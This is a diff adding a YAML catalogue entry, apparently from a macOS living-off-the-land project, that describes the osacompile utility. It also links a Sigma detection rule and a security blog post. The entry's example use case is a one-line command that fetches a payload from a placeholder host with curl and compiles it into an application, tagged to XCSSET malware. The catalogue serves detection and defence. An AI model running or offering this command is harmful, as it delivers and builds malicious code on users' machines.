@@ -1,0 +1,21 @@
+name: osacompile
+author: Brendan Chamberlain (@infosecB)
+short_description: Compile AppleScripts or OSA language scripts.
+full_description: osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.
+created: 2023-05-14
+example_use_cases:
+- name: Download and compile a payload
+  description: A description of the use case goes here.
+  code: curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app
+  tactics:
+  - Discovery
+  tags:
+  - XCSSET
+paths:
+- /usr/bin/osacompile
+detections:
+- name: "Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)"
+  url: https://github.com/SigmaHQ/sigma/pull/4127/commits/f4b0264a83e5f47473029e26dc0879fb196a7d07
+resources:
+- name: "A bundle of nerves: Tweaking macOS security controls to thwart application bundle manipulation"
+  url: https://redcanary.com/blog/mac-application-bundles/
